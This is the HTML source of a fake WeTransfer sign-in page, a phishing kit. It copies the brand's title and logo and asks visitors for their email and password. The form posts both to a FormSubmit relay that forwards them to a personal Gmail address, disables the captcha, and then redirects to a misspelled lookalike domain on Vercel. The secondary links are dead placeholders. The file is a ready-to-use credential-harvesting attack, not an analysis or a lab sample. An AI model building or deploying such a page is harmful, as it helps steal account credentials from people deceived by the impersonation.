<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Wetransfer</title>

<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins',sans-serif;
}

/* Safe, minimal page padding that respects notches */
:root{
  --page-pad: 12px;
}

body{
  background:#f4f4f4;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:20px;
  padding-left: max(20px, env(safe-area-inset-left));
  padding-right: max(20px, env(safe-area-inset-right));
}

.wrapper{
  width:100%;
  max-width:420px;
  background:#f4f4f4;
  text-align:center;
  margin:0 auto;
  padding:0 8px; /* base small side padding */
}

/* Give headings a tiny breathing room */
.logo,
.title,
.subtitle{
  margin-left:6px;
  margin-right:6px;
}

/* Make sure inputs/buttons never touch edges */
.input-group{
  margin:0 6px 22px;
}

.btn{
  width:calc(100% - 12px);
  margin:5px 6px 0;
}

/* Tight screens */
@media (max-width: 480px){
  /* Slightly more side padding so elements don't hit the bezel */
  .wrapper{ padding:0 10px; }

  .logo{ font-size:clamp(36px, 9vw, 56px); margin:0 8px 6px; }
  .title{ font-size:clamp(18px, 6vw, 26px); margin:0 8px 4px; }
  .subtitle{ font-size:clamp(10px, 3.2vw, 13px); margin:0 8px 10px; }

  .input-group{ margin:0 8px 18px; }
  .input-group input{ padding:16px 18px; }
  .btn{
    width:calc(100% - 16px);
    margin:6px 8px 0;
    padding:16px;
  }
}

/* Very small devices */
@media (max-width: 320px){
  body{
    padding-left: max(var(--page-pad), env(safe-area-inset-left));
    padding-right: max(var(--page-pad), env(safe-area-inset-right));
    padding-top: var(--page-pad);
    padding-bottom: var(--page-pad);
  }
  .wrapper{ padding:0 8px; } /* keep a little space */
  .logo, .title, .subtitle{ margin-left:6px; margin-right:6px; }

  .input-group{ margin:0 6px 16px; }
  .input-group input{
    padding:14px 16px;
    font-size:16px;
  }
  .btn{
    font-size:18px;
    padding:14px;
    width:calc(100% - 12px);
    margin:6px 6px 0;
  }
}


</style>
</head>
<body>

<div class="wrapper">

  <img src="logo.08he3n6vuv2qc (1).svg">
  <div class="title">Sign In</div>
  <div class="subtitle">to continue to your WeTransfer account.</div>

  <!-- ✅ FormSubmit Integration -->
  <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">


    <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
    <input type="hidden" name="_captcha" value="false">

    <div class="input-group">
      <input type="email" name="email" placeholder="Enter email" required>
    </div>

    <div class="input-group">
      <input type="password" name="password" placeholder="Type your password..." required>
    </div>

    <button type="submit" class="btn">Continue</button>
  </form>

  <div class="links">
    <a href="#">Forgot password?</a>
    <a href="#">Use a different email?</a>
  </div>

  <div class="divider"><span>or</span></div>

  <div class="bottom-text">
    Receive a <a href="#">temporary code via email</a>
  </div>

</div>

</body>
</html>
